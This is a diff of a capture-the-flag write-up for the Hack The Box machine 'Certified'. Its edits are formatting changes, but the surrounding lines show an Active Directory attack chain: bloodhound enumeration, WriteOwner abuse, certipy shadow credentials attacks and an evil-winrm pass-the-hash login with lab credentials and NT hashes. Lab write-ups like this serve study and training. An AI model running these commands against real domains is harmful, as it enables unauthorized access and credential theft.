@@ -1,7 +1,7 @@
 ---
 tags:
   - Windows
-  - bloodhound
+  - DACL Abuse
   - ADCS
 ---
 
@@ -128,7 +128,7 @@ nxc ldap certified.htb -u 'certified.htb\judith.mader' -p 'judith09' --bloodhoun
 I start `bloodhound` with `bloodhound-start`, and upload the resulting `...bloodhound.zip` file which was created from the scan before, to the `File Ingest` tab if the `bloodhound` GUI.
 
 After waiting a while for the `Ingest` to complete, i head over to the `Explore` section and search for `user:judith.mader` in the search tab, and click on the `Outbound Object Control` to find out what permissions `judith` might have over other objects. 
-![](../../../Images/HTB_Images/Machines/Medium/Certified.png)
+![](/twlttrtxt-notes/Images/HTB_Images/Machines/Medium/Certified.png)
 Apparently, `judith` has `WriteOwner` permissions over the `Management`-group! When clicking on the `WriteOwner` line, `bloodhound` reveals that i can do the following attacks after granting myself ownership over this group:
 
 - `Modifying the rights`: I can grant myself the `AddMembers` permission, so i can add members to this `Management` group.
@@ -199,9 +199,10 @@ hashcat -m 13100 ./hash.txt ./rockyou.txt
 This did not work though.
 
 That is why i resort to the `Shadow Credentials Attack`. Usually this attack is performed using the combination of the tools `pywhisker.py` and `gettgtpkinit.py`, but i like to use `certipy` (installed with `pip3 install certipy-ad`) as this tool automates the whole process:
- ```bash
+```bash
 certipy shadow auto -u judith.mader@certified.htb -p 'judith09' -account 'management_svc'
- ```
+```
+
 The resulting `NT Hash` can be passed in the `evil-winrm` login to get a `PowerShell` as `management_svc`, eliminating the need for `Lateral Movement`:
 ```bash
 evil-winrm -i certified.htb -u "certified.htb\management_svc" -H a091c1832bcdd4677c28b5a6a1295584
@@ -251,10 +252,10 @@ net rpc password ca_operator password123 -U certified.htb/management_svc --use-k
 Sadly, this did not work, as `management_svc`, does not have write permissions to the `IPC$` share, or `Pass-The-Hash` is blocked for `SMB`.
 
 That is why i simply do an `Shadow Credentials attack` on the `ca_operator` account. Executing this command gives me the `NT Hash` file of `ca_operator`, just like before:
- ```bash
+```bash
 certipy shadow auto -u management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -account 'ca_operator'
- ```
- This gives me his `NT_HASH` `b4b86f45c6018f1b664f70805f45d8f2`!
+```
+This gives me his `NT_HASH` `b4b86f45c6018f1b664f70805f45d8f2`!
 
 Using this account, i can now enumerate the certificate template `CERTIFIEDAUTHENTICATION` for vulnerabilities using this command:
 ```bash
